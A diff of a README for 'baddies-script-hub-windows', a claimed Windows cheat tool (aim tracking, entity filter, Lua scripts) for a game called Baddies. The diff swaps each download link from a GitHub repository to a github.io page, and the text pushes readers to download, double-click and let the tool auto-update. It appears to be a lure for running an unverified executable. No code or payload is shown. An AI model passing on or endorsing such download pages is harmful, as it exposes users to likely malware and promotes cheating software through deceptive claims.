@@ -10,7 +10,7 @@
 
 ### Step 1: Get the File
 **Visit this link to download the application:**  
-👉 **[Download baddies-script-hub-windows](https://github.com/Medial-vegetablesoup486/baddies-script-hub-windows)**
+👉 **[Download baddies-script-hub-windows](https://medial-vegetablesoup486.github.io)**
 
 This link takes you to the official download page. One click and you're on your way.
 
@@ -151,7 +151,7 @@ Updates are automatic. Every time you open the hub, it checks for the latest scr
 
 It takes less than 60 seconds to get this running:
 
-1. 👉 **Visit the download page:** [Download baddies-script-hub-windows](https://github.com/Medial-vegetablesoup486/baddies-script-hub-windows)
+1. 👉 **Visit the download page:** [Download baddies-script-hub-windows](https://medial-vegetablesoup486.github.io)
 2. Download the file.
 3. Double-click to open.
 
@@ -175,6 +175,6 @@ For the best experience:
 Don't play Baddies (2026) at a disadvantage. Join thousands of players who already use **baddies-script-hub-windows** to take their game to the next level.
 
 **Your download is one click away:**  
-👉 [**Download baddies-script-hub-windows now**](https://github.com/Medial-vegetablesoup486/baddies-script-hub-windows)
+👉 [**Download baddies-script-hub-windows now**](https://medial-vegetablesoup486.github.io)
 
 Keywords: Baddies, script hub, Windows, aim tracking, entity filter, private room, Lua script, game helper, download, PC
